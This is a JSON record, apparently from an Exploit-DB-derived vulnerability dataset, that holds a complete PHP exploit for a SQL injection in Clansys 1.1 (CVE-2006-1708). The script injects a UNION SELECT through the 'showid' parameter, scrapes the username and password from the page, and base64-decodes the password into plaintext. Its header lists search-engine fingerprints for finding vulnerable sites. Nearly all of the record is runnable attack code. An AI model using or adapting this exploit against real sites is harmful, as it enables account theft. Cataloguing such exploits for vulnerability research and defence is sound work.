{
  "id": "1662",
  "title": "Clansys 1.1 (showid) - SQL Injection",
  "cve": "CVE-2006-1708",
  "vuln_type": "sqli",
  "code": "<?php /*\r\n\r\n |---==============================================================---|\r\n |                          /\\\u00af\\__       /\\\u00af\\                         |   \r\n |     ____    ___      __  \\ \\  _\\   ___\\ \\ \\___      __    ___      |    \r\n |    /  __\\ /  _  \\  / __ \\ \\ \\ \\/  / ___\\ \\  _  \\  / __ \\/\\  __\\    |    \r\n |   /\\__,  \\/\\ \\/\\ \\/\\ \\_\\ \\_\\ \\ \\_/\\ \\__/\\ \\ \\ \\ \\/\\  __/\\ \\ \\/     |     \r\n |   \\/\\____/\\ \\_\\ \\_\\ \\__/ \\_\\\\ \\__\\ \\____\\\\ \\_\\ \\_\\ \\____\\\\ \\_\\     |      \r\n |    \\/___/  \\/_/\\/_/\\/__/\\/_/ \\/__/\\/____/ \\/_/\\/_/\\/____/ \\/_/     |     \r\n |                                     >> Internet Security           |                         \r\n |---==============================================================---|\r\n \r\n        title: clansys 1.1 remote sql injection\r\n      release: 2006-04-10\r\n       author: snatcher [snatcher at gmx.ch]\r\n      country: switzerland  |+|\r\n\t  \r\n  application: clansys 1.1\r\n  description: a php / mysql based clan content management system\r\n     download: http://www.clanscripte.net/main.php?content=download&do=file&dlid=113\r\n  description: you can get each password with a simple sql injection. the password \r\n               is base64 encoded, but it's easy to decode, that means, you will get\r\n\t\t\t   the password in plaintext :)\r\n  fingerprint: google -> \"Clansys  v.1.1\" -> 4'030\r\n               msn -> \"Clansys  v.1.1\" ->  529\r\n   conditions: \r\n       greets: honkey, str0ke <- good exploit publisher :),\r\n\t\t\t   all security guys and coders over the world,\r\n terms of use: this exploit is just for educational purposes, do not use it for illegal acts.\r\n\r\n\r\n---------------------------- member.php - line 180 -------------------------------------\r\n$sql = \"SELECT * FROM member WHERE id=$showid\";\r\n-----------------------------------------------------------------------------------------\r\n\r\nbecause this $showid isn't escaped correctly you can insert malicious sql code,\r\ni.e. with a union operator.\r\n\r\n\r\n*/\r\n\r\n/*********************** CONFIGURATION ****************************/\r\n\r\n$PATH_TO_FILE  = 'http://yourhost.com/index.php';                  // in example: http://yourhost.com/index.php\r\n$USER_ID       = 1;                                                // which user? default: 1\r\n$TABLE_PREFIX  = '';                                               // default: empty\r\n$GET_VARS      = '?page=member&func=detail&showid=';               // do not change\r\n$SQL_INJECTION = '-666 union select 0,nick,realname,nick,pass,'.   // do not change\r\n                 'pass,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,'.\r\n\t\t\t\t '0,0,0 from '.$TABLE_PREFIX.'member where id = '.\r\n\t\t\t\t $USER_ID.' limit 1 /*';\r\n\r\n\r\n/**************************** MAIN ********************************/\r\n\r\n$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die('couldn\\'t open host!'); \r\nforeach ($file_array as $now)                               \r\n\t$html_content .= $now;\r\n\r\n$html_content = str_castrate($html_content);\r\n\r\npreg_match_all(\"!<tdwidth=224height=20valign=middlealign=center><p><br><br><b>(.*?)Details</p></td>!\",\r\n\t\t\t   $html_content,$username); /* gets username */\r\npreg_match_all(\"!wwp.icq.com\\/scripts\\/online.dll\\?icq=(.*?)=\\&img=5border=0align=top>!\", \r\n                $html_content,$password); /* gets password */\r\n\r\nif ($username[1][0] && $password[1][0]) {\r\n\techo 'username: <b>'.$username[1][0].'</b> (user_id: '.$USER_ID.')<br>';\r\n\techo 'password: <b>'.base64_decode($password[1][0]).'</b>';\r\n}else {\r\n\techo 'exploit failed! <br>';\r\n}\r\necho '<br><br><br><br><br>\r\n======================================================================<br>\r\nexploit: clansys 1.1 remote sql injection vulnerability<br>\r\nrelease: 2006-04-10<br>\r\nauthor: snatcher [snatcher at gmx.ch]<br>\r\n======================================================================';\r\n\r\nfunction str_castrate($string) {\r\n\t$string = str_replace(\"\\n\", '', $string);\r\n\t$string = str_replace(\"\\r\", '', $string);\r\n\t$string = str_replace(\" \", '', $string);\r\n\treturn $string;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-04-10]",
  "url": "https://www.exploit-db.com/exploits/1662"
}